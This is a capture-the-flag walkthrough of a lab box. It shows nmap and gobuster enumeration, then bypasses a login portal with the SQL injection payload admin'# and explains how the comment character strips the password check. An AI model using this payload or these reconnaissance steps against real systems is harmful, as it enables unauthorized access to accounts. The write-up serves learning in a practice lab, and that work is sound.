# 🛡️ SQL Injection Login Bypass – CTF Walkthrough

This box revolved around classic SQL injection through a login portal. After service enumeration and brute-force login attempts failed, we successfully bypassed the login via input manipulation.

---

## 🔍 1. Nmap Enumeration

Started with a full port and version scan:

```bash
nmap -sV -p- 10.129.241.26
```

**Result:**
- Port `80/tcp` open – HTTP web server detected
- Server version appeared secure (no known vulnerabilities)

---

## 🌐 2. Web App Discovery

Navigated to `http://10.129.241.26/` and found a **login portal**.

---

## 🔐 3. Default Credential Attempts

Tried common usernames to guess default creds:

- `admin`
- `administrator`
- `root`
- `guest`
- `user`

None succeeded.

---

## 📁 4. Directory Enumeration with Gobuster

Next, used `gobuster` to look for hidden directories:

```bash
gobuster dir --url http://10.129.241.26/ -w /usr/share/wordlists/dirb/common.txt
```

**Outcome:**
- No relevant directories discovered

---

## 🧨 5. SQL Injection Login Bypass

With no luck from creds or directories, tested an **SQL injection** payload in the username field.

### Payload:
```text
Username: admin'#
Password: anything
```

### Why It Worked

This input likely manipulated the backend SQL query:

```sql
SELECT * FROM users WHERE username = 'admin'#' AND password = '...';
```

The `#` comment character **truncated the password clause**, turning the query into:

```sql
SELECT * FROM users WHERE username = 'admin';
```

If a user named `admin` exists in the database, the query returns true, and access is granted without password validation.

---

## ✅ Summary Table

| Step                  | Command / Action                                                           |
|-----------------------|----------------------------------------------------------------------------|
| Port Scan             | `nmap -sV -p- 10.129.241.26`                                               |
| Directory Enumeration | `gobuster dir --url http://10.129.241.26/ -w common.txt`                  |
| SQL Injection         | Username: `admin'#` <br> Password: anything                               |
| Auth Bypass Success   | Logged in without valid credentials via SQL comment injection             |

---

## 🧠 Key Takeaways

- SQL injection remains a critical web app vulnerability if input is not sanitized.
- Comments (`#`, `--`, `/* */`) are powerful tools in injection payloads.
- Always test for input validation bypasses in login and search forms.
- Combine enumeration (Nmap, Gobuster) with application logic testing for best results.

**Box completed. Full pwn via login bypass. 🏁**
